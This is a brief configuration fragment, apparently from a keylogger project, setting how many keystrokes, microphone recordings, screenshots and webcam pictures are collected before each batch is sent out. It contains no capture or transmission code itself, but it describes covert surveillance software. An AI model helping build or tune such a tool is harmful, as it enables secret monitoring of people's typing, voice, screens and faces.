...
LOG_DIRECTORY_PATH = "/Users/mohamedkhettab/Desktop/Coding/Python/keylogger-v2/src"
...
# Input Configuration
MAX_INPUT_EVENTS_BEFORE_SEND = 10000

# Microphone Configuration
MICROPHONE_RECORD_DURATION_SEC = 60
MICROPHONE_RECORDINGS_BEFORE_SEND = 300

# Screen Configuration
SCREENSHOT_INTERVAL_SEC = 60
SCREENSHOTS_BEFORE_SEND = 300

# Webcam Configuration
WEBCAM_CAPTURE_INTERVAL_SEC = 60
WEBCAM_PICTURES_BEFORE_SEND = 300
